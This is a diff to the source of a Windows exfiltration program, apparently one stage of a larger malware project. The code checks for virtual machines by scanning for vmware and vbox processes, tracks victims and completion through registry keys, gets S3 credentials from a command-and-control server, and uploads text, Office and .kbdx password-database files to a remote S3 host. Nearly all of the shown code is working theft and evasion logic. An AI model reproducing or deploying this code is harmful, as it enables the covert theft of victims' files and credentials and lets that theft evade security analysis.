@@ -10,7 +10,6 @@ import sys  # Handling system related tasks (hostname/usernames)
 import ctypes  # Calling Windows APIs
 import winreg  # Editing Windows Registry
 from subprocess import check_output  # Reading processes on system
-from random import randint  # Random ints for 😴
 from time import sleep  # 😴
 
 # Variables
@@ -18,13 +17,11 @@ from time import sleep  # 😴
 c2_url = "http://localhost:5000"
 # Address of the remote S3 server
 s3_host = "minio.example.com"
-# List of paths. Every file in these locations will be encrypted ...
+# List of paths. Every file in these locations will be uploaded ...
 target_paths = [".\\toencrypt", ".\\toencrypt2"]
-# ..except for the filetypes defined in the following list
-exclude_types = (".exe", ".dll", ".img")
-# Files with these filetypes will be sent to the remote S3 server
+# ... but only with these extensions
 include_types = (".txt", ".doc", ".xls", ".docx", ".xlsx", ".kbdx")
-# If any of these processes is running on the host, BadThread will not run.
+# If any of these processes is running on the host, Exfiltration will not run.
 program_blacklist = [
     "vmware",
     "vbox",
@@ -37,25 +34,22 @@ program_blacklist = [
 
 
 class Exfiltration:
-    """This object initializes the exfiltration malware"""
+    """This object initializes the exfiltration stage"""
 
     def __init__(self):
         self.victim_id = None
+        # S3 credentials which will be received by C2 server later on
         self.s3_bucket = None
         self.s3_access_key = None
         self.s3_secret_key = None
 
     def initial_check(self):
         """Checks for existing Registry entries -> Has the Loader been successfully initialized?"""
-        keyName = r"Software\Blocky\Main"
-        try:
-            # If key exists, create a Loader object without getting the already known system info, and start loop again
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
-            )
-            self.victim_id = winreg.QueryValueEx(key, "ID")[0]
-        except:
-            # Else exit the program
+        if self.check_registry_entry("ExfiltrationDone") == "True":
+            sys.exit()
+        if self.check_registry_entry("ID") is not None:
+            self.victim_id = self.check_registry_entry("ID")
+        else:
             sys.exit()
 
     def is_admin(self):
@@ -77,7 +71,7 @@ class Exfiltration:
             process.lower().split(",")[0][1:-5] for process in tasks_formatted
         ]
         for x in program_blacklist:
-            # As soon as 1 blacklisted program is detected, return True -> Main will not execute BadThread
+            # As soon as 1 blacklisted program is detected, return True -> Malware will not be executed
             if x in tasks_listed:
                 return True
         return False
@@ -94,6 +88,7 @@ class Exfiltration:
             return False
 
     def create_registry_entry(self, subkey, subkeyvalue):
+        """Creates a Registry entry with the given subkey and subkeyvalue"""
         keyName = r"Software\Blocky\Main"
         try:
             key = winreg.OpenKey(
@@ -103,6 +98,18 @@ class Exfiltration:
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
         winreg.SetValueEx(key, subkey, 0, winreg.REG_SZ, subkeyvalue)
         winreg.CloseKey(key)
+
+    def check_registry_entry(self, subkey):
+        """Checks for existing Registry entries -> Has the malware been here before?"""
+        keyName = r"Software\Blocky\Main"
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
+            )
+            return winreg.QueryValueEx(key, subkey)[0]
+        except:
+            # Else exit the program
+            return None
 
     def upload_to_s3(self):
         """Uploads all files in target_paths to the remote S3 server"""
@@ -135,7 +142,7 @@ class Exfiltration:
                 except Exception as err:
                     print(f"upload_to_s3(): Error --> {err}")
                     return False
-        self.create_registry_entry("ExfiltrationFinished", "True")
+        self.create_registry_entry("ExfiltrationDone", "True")
         return True
 
 
@@ -156,4 +163,3 @@ if __name__ == "__main__":
     exfiltration.get_s3_credentials()
     # Upload all files in target_paths to the remote S3 server
     exfiltration.upload_to_s3()
-    # Create a registry entry to mark the exfiltration as finished
